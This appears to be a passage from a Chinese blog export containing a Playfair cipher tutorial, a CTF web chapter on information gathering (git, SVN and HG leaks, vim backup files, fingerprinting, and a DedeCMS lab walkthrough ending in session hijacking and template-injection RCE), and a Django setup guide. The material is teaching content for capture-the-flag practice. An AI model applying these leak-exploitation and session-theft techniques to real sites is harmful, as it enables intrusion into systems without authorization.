    <content><![CDATA[<h2 id="Playfair密码"><a href="#Playfair密码" class="headerlink" title="Playfair密码"></a>Playfair密码</h2><p> Playfair密码（Playfair cipher 或 Playfair square）一种替换密码，1854年由查尔斯·惠斯通（Charles Wheatstone）的英国人发明。</p>
<p>编写分三步：1.编制密码表 2.整理明文 3.编写密文<br>构成部分：1.密钥 2.明文3.密文4.注明的某个字母代替的另一个字母</p>
<h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><blockquote>
<p>百度百科：它依据一个5*5的正方形组成的密码表来编写，密码表里排列有25个字母。如果一种语言字母超过25个，可以去掉使用频率最少的一个。<br>如，法语一般去掉w或k，德语则是把i和j合起来当成一个字母看待。英语中z使用最少，可以去掉它。</p>
</blockquote>
<blockquote>
<p>搜狗百科：由于是5×5的矩阵，而英文字母共26个，通常有两种处理方法：<br>①若密钥和明文中均不含字母Q则填入矩阵时不包括Q                           &gt;②若密钥或明文中均含有字母Q则填入矩阵时字母I和J捆绑在一起<code>I ( J )</code>看做一个字母，占一个格子。</p>
</blockquote>
<h4 id="例"><a href="#例" class="headerlink" title="例:"></a><strong>例:</strong></h4><p>某种加密方式，玩一玩吧 密钥：shiyanb 密文：KQSAMFPAOPMFPA hint：一律采用横向Hint: key小写</p>
<p>1、编制密码表        编一个5<em>5的密码表，共有5行5列字母。第一列（或第一行）是密钥,其余按照字母顺序，如果密钥过长可占用第二列或行。密钥是一个单词或词组，若有重复字母，可将后面重复的字母去掉。当然也要把使用频率最少的字母去掉（它依据一个5</em>5的正方形组成的密码表来编写，密码表里排列有25个字母。如果一种语言字母超过25个，可以去掉使用频率最少的一个。如，法语一般去掉w或k，德语则是把i和j合起来当成一个字母看待，英语中z使用最少，可以去掉它）。        例：密钥是Live and learn,去掉后则为liveandr</p>
<p>密钥：shiyanb 可编成<br>s    h     i      y     a<br>n    b     c     d     e<br>f     g     j      k      l<br>m   o     p     q      r<br>t     u     v     w      x</p>
<p>2、整理明文/密文，将明文/密文每两个字母组成一对。如果成对后有两个相同字母紧挨或最后一个字母是单个的，就插入一个字母X（或者Q）。<br>密文： KQSAMFPAOPMFPA<br>KQ  SA  MF  PA  OP  MF  PA</p>
<h3 id="解密规则"><a href="#解密规则" class="headerlink" title="解密规则"></a>解密规则</h3><p>（1） 若c1 c2在同一行，对应明文p1 p2分别是紧靠c1 c2 左端的字母。其中最后一列被看做是第一列的左方。<br>  （2） 若c1 c2在同一列，对应明文p1 p2分别是紧靠c1 c2 上方的字母。其中最后一行被看做是第一行的上方。<br>  （3）若c1 c2不在同一行，不在同一列，则p1 p2是由c1 c2确定的矩形的其他两角的字母。</p>
<pre><code> 密文：KQ   SA    MF    PA    OP    MF    PA
 明文：dk    ay     fn       ir     mo     fn       ir</code></pre><p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210318205844.png" alt="2067beeac983984f98166d15082755c8.png"></p>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210318205845.png" alt="ca89ed76f8170a0e321fa382cf2e1942.png"></p>
<h3 id="加密规则"><a href="#加密规则" class="headerlink" title="加密规则"></a>加密规则</h3><p>  （1）若p1 p2在同一行，对应密文c1 c2分别是紧靠p1 p2 右端的字母。其中第一列被看做是最后一列的右方。如，按照前表，fg对应gj，mr对应om<br>  （2） 若p1 p2在同一列，对应密文c1 c2分别是紧靠p1 p2 下方的字母。其中第一行被看做是最后一行的下方。<br>  （3）若p1 p2不在同一行，不在同一列，则c1 c2是由p1 p2确定的矩形的其他两角的字母（至于横向替换还是纵向替换要事先约好，或自行尝试）。如，按照前表，ir对应pa或ap。</p>
<p>参考文章：<code>https://www.cnblogs.com/xdjun/p/7469841.html</code></p>
]]></content>
      <categories>
        <category>crypto</category>
      </categories>
      <tags>
        <tag>crypto</tag>
        <tag>playfair</tag>
      </tags>
  </entry>
  <entry>
    <title>从0到1：web入门（一）信息搜集</title>
    <url>/from0to1webrumenxinxisouji.html</url>
    <content><![CDATA[<p>参考书籍：《从0到1：ctfer成长之路》<br>对相应实战案例进行复现总结</p>
<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>​    在传统的CTF线上比赛中，Web类题目是主要的题型之一，相较于二进制、逆向等类型的题目，参赛者不需掌握系统底层知识；相较于密码学、杂项问题，不需具特别强的编程能力，故入门较为容易。Web类题目常见的漏洞类型包括注入、XSS、文件包含、代码执行、上传、SSRF等。</p>
<p>本章将分别介绍CTF线上比赛中常见的各种Web漏洞，通过相关例题解析，尽可能让读者对CTF线上比赛的Web类题目有相对全面的了解。但是Web漏洞的分类十分复杂，希望读者在阅读本书的同时在互联网上了解相关知识，这样才可以达到举一反三的目的，以便提升自身能力。</p>
<p>按照漏洞出现的频率、漏洞的复杂程度，我们将Web类题目分为入门、进阶、拓展三个层次进行介绍。讲解每个层次的漏洞时，我们辅以相关例题解析，让读者更直观地了解CTF线上比赛中Web类题目不同漏洞带来的影响，由浅入深地了解Web类题目，清楚自身技能的不足，从而达到弥补的目的。本章从“入门”层次开始，介绍Web类题目中最常见的3类漏洞，即信息搜集、SQL注入、任意文件读取漏洞。</p>
<h2 id="1-1-举足轻重的信息搜集"><a href="#1-1-举足轻重的信息搜集" class="headerlink" title="1.1 举足轻重的信息搜集"></a>1.1 举足轻重的信息搜集</h2><h3 id="1-1-1-信息搜集的重要性"><a href="#1-1-1-信息搜集的重要性" class="headerlink" title="1.1.1 信息搜集的重要性"></a>1.1.1 信息搜集的重要性</h3><p>古人云“知己知彼，百战不殆”，在现实世界和比赛中，信息搜集是前期的必备工作，也是重中之重。在CTF线上比赛的Web类题目中，信息搜集涵盖的面非常广，有备份文件、目录信息、Banner信息等，这就需要参赛者有丰富的经验，或者利用一些脚本来帮助自己发现题目信息、挖掘题目漏洞。本节会尽可能叙述在CTF线上比赛中Web类题目包含的信息搜集，也会推荐一些作者测试无误的开源工具软件。</p>
<p>因为信息搜集大部分是工具的使用（git泄露可能涉及git命令的应用），所以本章可能不会有太多的技术细节。同时，因为信息搜集的种类比较多，本章会尽可能地涵盖，如有不足之处还望理解；最后会通过比赛的实际例子来体现信息搜集的重要性。</p>
<h3 id="1-1-2-信息搜集的分类"><a href="#1-1-2-信息搜集的分类" class="headerlink" title="1.1.2 信息搜集的分类"></a>1.1.2 信息搜集的分类</h3><p>前期的题目信息搜集可能对于解决CTF线上比赛的题目有着非常重要的作用，下面将从敏感目录、敏感备份文件、Banner识别三方面来讲述基础的信息搜集，以及如何在CTF线上比赛中发现解题方向。</p>
<h4 id="1-1-2-1-敏感目录泄露"><a href="#1-1-2-1-敏感目录泄露" class="headerlink" title="1.1.2.1 敏感目录泄露"></a>1.1.2.1 敏感目录泄露</h4><p>通过敏感目录泄露，我们往往能获取网站的源代码和敏感的URL地址，如网站的后台地址等。</p>
<h5 id="1．git泄露"><a href="#1．git泄露" class="headerlink" title="1．git泄露"></a>1．git泄露</h5><p>【漏洞简介】</p>
<p>git是一个主流的分布式版本控制系统，开发人员在开发过程中经常会遗忘.git文件夹，导致攻击者可以通过.git文件夹中的信息获取开发人员提交过的所有源码，进而可能导致服务器被攻击而沦陷。</p>
<h6 id="（1）常规git泄露"><a href="#（1）常规git泄露" class="headerlink" title="（1）常规git泄露"></a>（1）常规git泄露</h6><p>常规git泄露：即没有任何其他操作，参赛者通过运用现成的工具或自己编写的脚本即可获取网站源码或者flag。这里推荐一个工具：<a href="https://github.com/denny0223/scrabble，使用方法也很简单：">https://github.com/denny0223/scrabble，使用方法也很简单：</a></p>
<pre><code>./scrabble http://example.com/</code></pre><p>本地自行搭建Web环境</p>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210313142154.png" alt="image-20210201215236121"></p>
<p>初始化git（在内部会生成隐藏的.git文件夹）</p>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210313142155.png" alt="image-20210201215430062"></p>
<p><strong>git add</strong> 命令可将flag.php文件添加到暂存区。</p>
<blockquote>
<p>文件修改后，我们一般都需要进行 git add 操作，从而保存历史版本。</p>
</blockquote>
<p>git commit -m “注释”把它提交到版本库：</p>
<p>git status -sb 查看工作区</p>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210313142156.png" alt="image-20210201220259747"></p>
<p>运行该工具，即可获取源代码，拿到flag</p>
<pre><code>./scrabble http://127.0.0.1/git_test/</code></pre><p>注：该工具只能在linux下运行</p>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210313142157.png" alt="image-20210209151029120"></p>
<h6 id="（2）git回滚"><a href="#（2）git回滚" class="headerlink" title="（2）git回滚"></a>（2）git回滚</h6><p>git作为一个版本控制工具，会记录每次提交（commit）的修改，所以当题目存在git泄露时，flag（敏感）文件可能在修改中被删除或被覆盖了，这时我们可以利用git的“git reset”命令来恢复到以前的版本。本地自行搭建Web环境</p>
<pre><code>echo "flag is old" &gt; flag.php</code></pre><p>覆盖flag</p>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210313142158.png" alt="image-20210209151647567"></p>
<p>我们先利用scrabble工具获取源码，再通过“git reset–hard HEAD^”命令跳到上一版本（在git中，用HEAD表示当前版本，上一个版本是HEAD^），即可获取到源码</p>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210313142159.png" alt="image-20210209151955012"></p>
<p>除了使用“git reset”，更简单的方式是通过“git log-stat”命令查看每个commit修改了哪些文件，再用“git diff HEAD commit-id”比较在当前版本与想查看的commit之间的变化。</p>
<h6 id="（3）git分支"><a href="#（3）git分支" class="headerlink" title="（3）git分支"></a>（3）git分支</h6><p>在每次提交时，git都会自动把它们串成一条时间线，这条时间线就是一个分支。而git允许使用多个分支，从而让用户可以把工作从开发主线上分离出来，以免影响开发主线。如果没有新建分支，那么只有一条时间线，即只有一个分支，git中默认为master分支。因此，我们要找的flag或敏感文件可能不会藏在当前分支中，这时使用“git log”命令只能找到在当前分支上的修改，并不能看到我们想要的信息，因此需要切换分支来找到想要的文件。</p>
<p>现在大多数现成的git泄露工具都不支持分支，如果需要还原其他分支的代码，往往需要手工进行文件的提取，这里以功能较强的GitHacker（<a href="https://github.com/WangYihang/GitHacker）工具为例。GitHacker的使用十分简单，只需执行命令“python">https://github.com/WangYihang/GitHacker）工具为例。GitHacker的使用十分简单，只需执行命令“python</a> GitHacker.py <a href="http://127.0.0.1:8000/.git/”。运行后，我们会在本地看到生成的文件夹，进入后执行“git">http://127.0.0.1:8000/.git/”。运行后，我们会在本地看到生成的文件夹，进入后执行“git</a> log–all”或“git branch-v”命令，只能看到master分支的信息。如果执行“git reflog”命令，就可以看到一些checkout的记录，见图1-1-5。</p>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210313142200.png" alt="image-20210209152715027"></p>
<p>可以看到，除了master还有一个secret分支，但自动化工具只还原了master分支的信息，因此需要手动下载secret分支的head信息，保存到.git/refs/heads/secret中（执行命令“wget <a href="http://127.0.0.1:8000/.git/refs/heads/secret”）。恢复head信息后，我们可以复用GitHacker的部分代码，以实现自动恢复分支的效果。在GitHacker的代码中可以看到，他是先下载object文件，再使用git">http://127.0.0.1:8000/.git/refs/heads/secret”）。恢复head信息后，我们可以复用GitHacker的部分代码，以实现自动恢复分支的效果。在GitHacker的代码中可以看到，他是先下载object文件，再使用git</a> fsck检测，并继续下载缺失的文件。此处可以直接复用检测缺失文件并恢复的fixmissing函数。我们注释掉程序最后调用main的部分，修改为如下代码：</p>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210313142201.png" alt="image-20210209152744662"></p>
<p>修改后重新执行“python GitHacker.py”命令，运行该脚本，再次进入生成的文件夹，执行“git log–all”或“git branch-v”命令，则secret分支的信息就可以恢复了，从git log中找到对应提交的hash，执行“git diff HEAD b94c”（b94c为hash的前4位）命令，即可得到flag，见图1-1-6。</p>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210313142202.png" alt="image-20210209152819543"></p>
<h6 id="（4）git泄露的其他利用"><a href="#（4）git泄露的其他利用" class="headerlink" title="（4）git泄露的其他利用"></a>（4）git泄露的其他利用</h6><p>除了查看源码的常见利用方式，泄露的git中也可能有其他有用的信息，如.git/config文件夹中可能含有access_token信息，从而可以访问这个用户的其他仓库。</p>
<h5 id="2．SVN泄露"><a href="#2．SVN泄露" class="headerlink" title="2．SVN泄露"></a>2．SVN泄露</h5><p>SVN（subversion）是源代码版本管理软件，造成SVN源代码漏洞的主要原因是管理员操作不规范将SVN隐藏文件夹暴露于外网环境，可以利用.svn/entries或wc.db文件获取服务器源码等信息。这里推荐两个工具：<a href="https://github.com/kost/dvcs-ripper，Seay-svn（Windows下的源代码备份漏洞利用工具）。">https://github.com/kost/dvcs-ripper，Seay-svn（Windows下的源代码备份漏洞利用工具）。</a></p>
<h5 id="3．HG泄露"><a href="#3．HG泄露" class="headerlink" title="3．HG泄露"></a>3．HG泄露</h5><p>在初始化项目时，HG会在当前文件夹下创建一个.hg隐藏文件夹，其中包含代码和分支修改记录等信息。这里推荐工具：<a href="https://github.com/kost/dvcs-ripper。">https://github.com/kost/dvcs-ripper。</a></p>
<h5 id="4．总结经验"><a href="#4．总结经验" class="headerlink" title="4．总结经验"></a>4．总结经验</h5><p>不论是.git这些隐藏文件，还是实战中的admin之类的敏感后台文件夹，其关键在于字典的强大，读者可以在某些工具的基础上进行二次开发，以满足自己需要。这里推荐一个开源的目录扫描工具：<a href="https://github.com/maurosoria/dirsearch。CTF线上比赛往往会有重定向一类问题。例如，只要访问.git，便会返回403，此时**试探着访问.git/config**，如果有文件内容返回，就说明存在git泄露，反之，一般不存在。">https://github.com/maurosoria/dirsearch。CTF线上比赛往往会有重定向一类问题。例如，只要访问.git，便会返回403，此时**试探着访问.git/config**，如果有文件内容返回，就说明存在git泄露，反之，一般不存在。</a></p>
<p>而在SVN泄露中，一般是在entries中爬取源代码，但有时会出现entries为空的情况，这时注意wc.db文件存在与否，便可通过其中的checksum在pristine文件夹中获取源代码。</p>
<h4 id="1-1-2-2-敏感备份文件"><a href="#1-1-2-2-敏感备份文件" class="headerlink" title="1.1.2.2 敏感备份文件"></a>1.1.2.2 敏感备份文件</h4><p>通过一些敏感的备份文件，我们往往能获得某一文件的源码，亦或网站的整体目录等。</p>
<h5 id="1．gedit备份文件"><a href="#1．gedit备份文件" class="headerlink" title="1．gedit备份文件"></a>1．gedit备份文件</h5><p>在Linux下，用gedit编辑器保存后，当前目录下会生成一个后缀为“～”的文件，其文件内容就是刚编辑的内容。假设刚才保存的文件名为flag，则该文件名为flag～，见图1-1-7。通过浏览器访问这个带有“～”的文件，便可以得到源代码。</p>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210313142203.png" alt="image-20210209153234794"></p>
<h5 id="2．vim备份文件"><a href="#2．vim备份文件" class="headerlink" title="2．vim备份文件"></a>2．vim备份文件</h5><p>vim是目前运用得最多的Linux编辑器，当用户在编辑文件但意外退出时（如通过SSH连接到服务器时，在用vim编辑文件的过程中可能遇到因为网速不够导致的命令行卡死而意外退出的情况），会在当前目录下生成一个备份文件，文件名格式为：</p>
<blockquote>
<p>.文件名.swp</p>
</blockquote>
<p>该文件用来备份缓冲区中的内容即退出时的文件内容，见图1-1-8。</p>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210313142204.png" alt="image-20210209153412882"></p>
<p>针对SWP备份文件，我们可以用“vim-r”命令恢复文件的内容。这里先模拟执行“vim flag”命令，随后直接关闭客户端，当前目录下会生成一个.flag.swp文件。恢复SWP备份文件的办法是，先在当前目录下创建一个flag文件，再使用“vim-rflag”命令，即可得到意外退出时编辑的内容，见图1-1-9。</p>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210313142205.png" alt="image-20210209153435515"></p>
<h5 id="3．常规文件"><a href="#3．常规文件" class="headerlink" title="3．常规文件"></a>3．常规文件</h5><p>常规文件所依靠的无非就是字典的饱和性，不论是CTF比赛中还是现实世界中，我们都会碰到一些经典的有辨识的文件，从而让我们更好地了解网站。这里只是简单举一些例子，具体还需要读者用心搜集记录。</p>
<p>❖ robots.txt：记录一些目录和CMS版本信息。</p>
<p>❖ readme.md：记录CMS版本信息，有的甚至有Github地址。</p>
<p>❖ <a href="http://www.zip/rar/tar.gz：往往是网站的源码备份。">www.zip/rar/tar.gz：往往是网站的源码备份。</a></p>
<h5 id="4．总结经验-1"><a href="#4．总结经验-1" class="headerlink" title="4．总结经验"></a>4．总结经验</h5><p>在CTF线上比赛的过程中，出题人往往会在线运维题目，有时会因为各种情况导致SWP备份文件的生成，所以读者在比赛过程中可以编写实时监控脚本，对题目服务进行监控。vim在第一次意外退出时生成的备份文件为<em>.swp，第二次意外退出时的为</em>.swo，第三次退出时的为<em>.swn，以此类推。vim的官方手册中还有</em>.un.文件名.swp类型的备份文件。另外，在实际环境中，网站的备份往往可能是网站域名的压缩包。</p>
<h4 id="1-1-2-3-Banner识别"><a href="#1-1-2-3-Banner识别" class="headerlink" title="1.1.2.3 Banner识别"></a>1.1.2.3 Banner识别</h4><p>在CTF线上比赛中，一个网站的Banner信息（服务器对外显示的一些基础信息）对解题有着十分重要的作用，选手往往可以通过Banner信息来获得解题思路，如得知网站是用ThinkPHP的Web框架编写时，我们可以尝试ThinkPHP框架的相关历史漏洞。或者得知这个网站是Windows服务器，那么我们在测试上传漏洞时可以根据Windows的特性进行尝试。这里介绍最常用的两种Banner识别方式。</p>
<h5 id="1．自行搜集指纹库"><a href="#1．自行搜集指纹库" class="headerlink" title="1．自行搜集指纹库"></a>1．自行搜集指纹库</h5><p>Github上有大量成型且公开的CMS指纹库，读者可以自行查找，同时可以借鉴一些成型扫描器对网站进行识别。</p>
<h5 id="2．使用已有工具"><a href="#2．使用已有工具" class="headerlink" title="2．使用已有工具"></a>2．使用已有工具</h5><p>我们可以利用Wappalyzer工具（见图1-1-10），同时提供了成型的Python库，用法如下：</p>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210313142206.png" alt="image-20210209153708550"></p>
<p>在data目录下，apps.json文件是其规则库，读者可以根据自己需求自由添加。</p>
<h5 id="3．总结经验"><a href="#3．总结经验" class="headerlink" title="3．总结经验"></a>3．总结经验</h5><p>在进行服务器的Banner信息探测时，除了通过上述两种常见的识别方式，我们还可以尝试随意输入一些URL，有时可以通过404页面和302跳转页面发现一些信息。例如，开启了debug选项的ThinkPHP网站会在一些错误页面显示ThinkPHP的版本。</p>
<h3 id="1-1-3-从信息搜集到题目解决"><a href="#1-1-3-从信息搜集到题目解决" class="headerlink" title="1.1.3 从信息搜集到题目解决"></a>1.1.3 从信息搜集到题目解决</h3><p>下面通过一个CTF靶场赛场景的复盘，来展示如何从信息搜集到获得flag的过程。</p>
<h5 id="1．环境信息"><a href="#1．环境信息" class="headerlink" title="1．环境信息"></a>1．环境信息</h5><p>❖ Windows 7.</p>
<p>❖ PHPstudy 2018（开启目录遍历）。</p>
<p>❖ DedeCMS（织梦CMS，未开启会员注册）。</p>
<h5 id="2．解题步骤"><a href="#2．解题步骤" class="headerlink" title="2．解题步骤"></a>2．解题步骤</h5><p>通过访问网站，根据观察和Wappalyzer的提示（见图1-1-11和图1-1-12），我们可以发现这是搭建在Windows上的DedeCMS，访问默认后台目录发现是404，见图1-1-13。</p>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210313142207.png" alt="image-20210304200629531"></p>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210313142208.png" alt="image-20210304200643761"></p>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210313142209.png" alt="image-20210304200657987"></p>
<p>这时我们可以联想到DedeCMS在Windows服务器上存在后台目录爆破漏洞（漏洞成因在这里不过多叙述，读者可以自行查阅），我们在本地运行爆破脚本，得到目录为zggga111，见图1-1-14。</p>
<p>但是经过测试，我们发现其关闭了会员注册功能，也就意味着我们不能利用会员密码重置漏洞来重置管理员密码。我们应该怎么办？其实，在DedeCMS中，只要管理员登录过后台，就会在data目录下有一个相应的session文件，而这个题目恰好没有关闭目录遍历，见图1-1-15。所以我们可以获得管理员的session值，通过editcookie修改Cookie，从而成功进入后台，见图1-1-16。</p>
<p>然后在模板的标签源码碎片管理中插入一段恶意代码，即可执行任意命令，见图1-1-17和图1-1-18。</p>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210313142210.png" alt="image-20210304200810471"></p>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210313142211.png" alt="image-20210304200822456"></p>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210313142212.png" alt="image-20210304200834150"></p>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210313142213.png" alt="image-20210304200846475"></p>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210313142214.png" alt="image-20210304200900622"></p>
<p>3．总结这个例子可以反映信息搜集的重要性，体现在如下两方面。</p>
<p>❖ 一是服务器的信息，针对Windows服务器，大概率意味着我们去寻找CMS在其上的一些漏洞。</p>
<p>❖ 二是在不知道密码和无法重置的情况下，通过CMS网站本身的特性，结合目录遍历来实现最后的RCE（Remote Command/Code Execute，远程命令/代码执行）。</p>
]]></content>
      <categories>
        <category>从0到1：ctfer成长之路</category>
        <category>web</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>从0到1</tag>
      </tags>
  </entry>
  <entry>
    <title>基于Django3.0的web框架详细架构过程（一）</title>
    <url>/djangorumen1.html</url>
    <content><![CDATA[<p>参考书籍《python编程：从入门到实践》十八章，十九章，二十章内容</p>
<p>该书籍Django使用1.11版本，而如今Django已经更新到3.0+，</p>
<p>因此本文将进行两种版本的对比并且匹配版本更迭导致的代码报错问题，一步一步带你实现适用Django3.0版本的web框架。</p>
<h2 id="Django入门"><a href="#Django入门" class="headerlink" title="Django入门"></a>Django入门</h2><p>当今的网站实际上都是富应用程序（rich application），就像成熟的桌面应用程序一样。Python提供了一组开发Web应用程序的卓越工具。在本文章中，你将学习如何使用Django（<a href="http://djangoproject.com/）来开发一个名为“学习笔记”（Learning">http://djangoproject.com/）来开发一个名为“学习笔记”（Learning</a> Log）的项目，这是一个在线日志系统，让你能够记录所学习的有关特定主题的知识。</p>
<p>我们将为这个项目制定规范，然后为应用程序使用的数据定义模型。我们将使用Django的管理系统来输入一些初始数据，再学习编写视图和模板，让Django能够为我们的网站创建网页。Django是一个Web框架——一套用于帮助开发交互式网站的工具。Django能够响应网页请求，还能让你更轻松地读写数据库、管理用户等。在第19章和第20章，我们将改进“学习笔记”项目，再将其部署到活动的服务器，让你和你的朋友能够使用它。</p>
<h3 id="一、建立项目"><a href="#一、建立项目" class="headerlink" title="一、建立项目"></a>一、建立项目</h3><p>建立项目时，首先需要以规范的方式对项目进行描述，再建立虚拟环境，以便在其中创建项目。</p>
<h4 id="（一）制定规范"><a href="#（一）制定规范" class="headerlink" title="（一）制定规范"></a>（一）制定规范</h4><p>完整的规范详细说明了项目的目标，阐述了项目的功能，并讨论了项目的外观和用户界面。与任何良好的项目规划和商业计划书一样，规范应突出重点，帮助避免项目偏离轨道。这里不会制定完整的项目规划，而只列出一些明确的目标，以突出开发的重点。我们制定的规范如下：</p>
<p>我们要编写一个名为“学习笔记”的Web应用程序，让用户能够记录感兴趣的主题，并在学习每个主题的过程中添加日志条目。“学习笔记”的主页对这个网站进行描述，并邀请用户注册或登录。用户登录后，就可创建新主题、添加新条目以及阅读既有的条目。学习新的主题时，记录学到的知识可帮助跟踪和复习这些知识。优秀的应用程序让这个记录过程简单易行。</p>
<h4 id="（二）建立虚拟环境"><a href="#（二）建立虚拟环境" class="headerlink" title="（二）建立虚拟环境"></a>（二）建立虚拟环境</h4><p>要使用Django，首先需要建立一个虚拟工作环境。虚拟环境是系统的一个位置，你可以在其中安装包，并将其与其他Python包隔离。将项目的库与其他项目分离是有益的，且为了在第20章将“学习笔记”部署到服务器，这也是必须的。</p>
<p>为项目新建一个目录，将其命名为learning_log，再在终端中切换到这个目录，并创建一个虚拟环境。如果你使用的是Python3，可使用如下命令来创建虚拟环境：</p>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210312202305.png" alt="image-20210306215725707"></p>
<p>这里运行了模块venv，并使用它来创建一个名为ll_env的虚拟环境。如果这样做管用，请跳到后面的18.1.4节；如果不管用，请阅读18.1.3节。</p>
<h4 id="（三）安装virtualenv"><a href="#（三）安装virtualenv" class="headerlink" title="（三）安装virtualenv"></a>（三）安装virtualenv</h4><p>如果你使用的是较早的Python版本，或者系统没有正确地设置，不能使用模块venv，可安装virtualenv包。为此，可执行如下命令：</p>
<pre class="line-numbers language-bash"><code class="language-bash">pip3 <span class="token function">install</span> --user virtualenv<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>别忘了，对于这个命令，你可能需要使用稍微不同的版本（如果你没有使用过pip，请参阅12.2.1节）。</p>
<blockquote>
<p>注意　如果你使用的是Linux系统，且上面的做法不管用，可使用系统的包管理器来安装virtualenv。例如，要在Ubuntu系统中安装virtualenv，可使用命令sudo apt-getinstall python-virtualenv。</p>
</blockquote>
<p>在终端中切换到目录learning_log，并像下面这样创建一个虚拟环境：</p>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210312202306.png" alt="image-20210306220146051"></p>
<blockquote>
<p>注意　如果你的系统安装了多个Python版本，需要指定virtualenv使用的版本。例如，命令virtualenv ll_env –python=python3创建一个使用Python 3的虚拟环境。</p>
</blockquote>
<p>win10可用</p>
<pre><code>python3 -m virtualenv 11_env</code></pre><p>来创建</p>
<h4 id="（四）激活虚拟环境"><a href="#（四）激活虚拟环境" class="headerlink" title="（四）激活虚拟环境"></a>（四）激活虚拟环境</h4><p>建立虚拟环境后，需要使用下面的命令激活它：</p>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210312202307.png" alt="image-20210306220424250"></p>
<p>这个命令运行ll_env/bin中的脚本activate。环境处于活动状态时，环境名将包含在括号内，如❶处所示。在这种情况下，你可以在环境中安装包，并使用已安装的包。你在ll_env中安装的包仅在该环境处于活动状态时才可用。</p>
<blockquote>
<p>注意　如果你使用的是Windows系统，请使用命令ll_env\Scripts\activate（不包含source）来激活这个虚拟环境。</p>
<p>若报错请使用完整的路径</p>
</blockquote>
<pre><code>E:\科技创新项目\djange框架\learning_log\11_env\Scripts\activate
</code></pre><p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210312202308.png" alt=""></p>
<p>要停止使用虚拟环境，可执行命令deactivate：</p>
<pre><code>E:\科技创新项目\djange框架\learning_log\11_env\Scripts\deactivate</code></pre><p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210312202309.png" alt="image-20210306221052970"></p>
<p>如果关闭运行虚拟环境的终端，虚拟环境也将不再处于活动状态。 </p>
<h4 id="（五）安装Django"><a href="#（五）安装Django" class="headerlink" title="（五）安装Django"></a>（五）安装Django</h4><p>创建并激活虚拟环境后，就可安装Django了：</p>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210312202310.png" alt="image-20210307140107209"></p>
<p>由于我们是在虚拟环境中工作，因此在所有的系统中，安装Django的命令都相同：不需要指定标志–user，也无需使用python -m pip install package_name这样较长的命令。</p>
<p>别忘了，Django仅在虚拟环境处于活动状态时才可用。</p>
<h4 id="（六）在Django中创建项目"><a href="#（六）在Django中创建项目" class="headerlink" title="（六）在Django中创建项目"></a>（六）在Django中创建项目</h4><p>在依然处于活动的虚拟环境的情况下（ll_env包含在括号内），执行如下命令来新建一个项目：</p>
<pre><code>django-admin startproject learning_log .</code></pre><p>该处的命令让Django新建一个名为learning_log的项目。这个命令末尾的句点让新项目使用合适的目录结构，这样开发完成后可轻松地将应用程序部署到服务器。</p>
<blockquote>
<p>注意　千万别忘了这个句点，否则部署应用程序时将遭遇一些配置问题。如果忘记了这个句点，就将创建的文件和文件夹删除（ll_env除外），再重新运行这个命令。</p>
</blockquote>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210312202311.png" alt=""></p>
<p>注意windows下ls指令无法使用，要用dir查看目录下所有文件</p>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210312202312.png" alt="image-20210307142102148"></p>
<p>该处运行了命令ls（在Windows系统上应为dir），结果表明Django新建了一个名为learning_log的目录。它还创建了一个名为manage.py的文件，这是一个简单的程序，它接受命令并将其交给Django的相关部分去运行。我们将使用这些命令来管理诸如使用数据库和运行服务器等任务。</p>
<p>目录learning_log包含4个文件（见上），其中最重要的是settings.py、urls.py和wsgi.py。文件settings.py指定Django如何与你的系统交互以及如何管理项目。在开发项目的过程中，我们将修改其中一些设置，并添加一些设置。文件urls.py告诉Django应创建哪些网页来响应浏览器请求。文件wsgi.py帮助Django提供它创建的文件，这个文件名是web server gatewayinterface（Web服务器网关接口）的首字母缩写。</p>
<h4 id="（七）创建数据库"><a href="#（七）创建数据库" class="headerlink" title="（七）创建数据库"></a>（七）创建数据库</h4><p>Django将大部分与项目相关的信息都存储在数据库中，因此我们需要创建一个供Django使用的数据库。为给项目“学习笔记”创建数据库，请在处于活动虚拟环境中的情况下执行下面的命令：</p>
<pre><code>python3 manage.py migrate</code></pre><p>下图中的该处Django指出它将创建必要的数据库表，用于存储我们将在这个项目（Synchronizeunmigrated apps，同步未迁移的应用程序）中使用的信息，再确保数据库结构与当前代码（Apply all migrations，应用所有的迁移）匹配。</p>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210312202313.png" alt="image-20210307142102148"></p>
<p>我们将修改数据库称为迁移数据库。首次执行命令migrate时，将让Django确保数据库与项目的当前状态匹配。在使用SQLite（后面将更详细地介绍）的新项目中首次执行这个命令时，Django将新建一个数据库。</p>
